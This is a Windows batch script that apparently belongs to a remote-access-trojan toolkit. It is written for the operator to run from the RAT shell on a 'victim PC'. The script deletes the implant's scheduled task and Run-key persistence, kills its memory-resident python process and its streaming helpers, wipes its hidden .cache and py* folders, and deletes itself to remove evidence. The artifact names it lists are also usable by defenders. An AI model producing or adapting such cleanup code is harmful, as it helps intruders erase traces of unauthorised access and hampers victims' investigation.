@echo off
rem ============================================================
rem  RAT full cleanup - removes every artifact on the victim PC
rem
rem  HOW TO RUN (from the RAT shell, one line):
rem    start "" cmd /c "%USERPROFILE%\rat_cleanup.bat"
rem  The shell session will drop when the implant is killed -
rem  that is expected. Cleanup continues detached.
rem
rem  Removes:
rem   - persistence: scheduled task "RuntimeUpdateTask" + Run values
rem   - processes: RAM-resident python (-I -), loader helper.exe,
rem     node.exe streamer, ffmpeg children
rem   - files: %USERPROFILE%\.cache (helper.exe/runtime.exe/updater.exe,
rem     nvdesk, nvnode, nvstream.log, nvspid.txt, under.json, .installed)
rem   - ephemeral: %USERPROFILE%\pyXXXXXXXX runtime dirs
rem   - this script itself
rem ============================================================
setlocal EnableExtensions
set "UP=%USERPROFILE%"

rem ---- 1. persistence FIRST (so nothing re-plants mid-cleanup) ----
schtasks /Delete /TN "RuntimeUpdateTask" /F >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "RuntimeUpdateTask" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "runtime.exe" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "updater.exe" /f >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "helper.exe" /f >nul 2>&1

rem belt-and-braces: any task/Run value pointing into .cache or py* dirs
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object { $_.Actions | Where-Object { $_.Execute -like '*\.cache\*' -or $_.Execute -like '*\py????????\*' } } | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue; $rk='HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'; if (Test-Path $rk) { Get-ItemProperty $rk | Out-Null; $k=Get-Item $rk; foreach ($p in $k.Property) { $v=(Get-ItemProperty $rk -Name $p).$p; if ($v -like '*\.cache\*' -or $v -like '*\py????????*') { Remove-ItemProperty $rk -Name $p -Force -ErrorAction SilentlyContinue } } }"

rem ---- 2. kill processes: loader + node + ffmpeg (under .cache) ----
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "Get-CimInstance Win32_Process | Where-Object { $_.ExecutablePath -and ($_.ExecutablePath -like ('{0}\.cache\*' -f $env:USERPROFILE) -or $_.ExecutablePath -like ('{0}\py????????\*' -f $env:USERPROFILE)) } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"

rem kill the RAM-resident implant: hidden python reading script from stdin
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
  "Get-CimInstance Win32_Process -Filter \"Name='python.exe'\" | Where-Object { $_.CommandLine -match '-I\s' -or $_.CommandLine -like '*-I -*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"

rem give dying processes a moment to release file locks
ping -n 3 127.0.0.1 >nul

rem ---- 3. delete files ----
rem installed loader + implant + netvnc runtime (nvdesk/nvnode/logs/pipes)
attrib -h -s "%UP%\.cache" >nul 2>&1
rd /s /q "%UP%\.cache" >nul 2>&1

rem ephemeral python runtime dirs (pyXXXXXXXX)
for /d %%D in ("%UP%\py*") do (
  attrib -h -s "%%D" >nul 2>&1
  rd /s /q "%%D" >nul 2>&1
)

rem ---- 4. self-delete ----
(goto) 2>nul & del /f /q "%~f0"
endlocal
